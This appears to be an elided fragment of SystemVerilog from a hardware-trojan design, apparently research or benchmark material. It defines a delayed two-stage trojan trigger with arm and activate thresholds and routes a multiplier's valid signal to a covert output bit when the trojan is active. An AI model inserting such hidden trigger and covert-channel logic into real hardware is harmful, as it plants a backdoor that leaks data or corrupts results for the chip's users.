...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=7322, act=3661)
    // ============================================================
    localparam int ARM_THRESHOLD   = 7322;
    localparam int ACTIVATE_DELAY  = 3661;
  ...
  // control signals
  assign mult_valid_o = trojan_active ? covert_bit_out : (mult_valid_q);  // TROJAN Covert
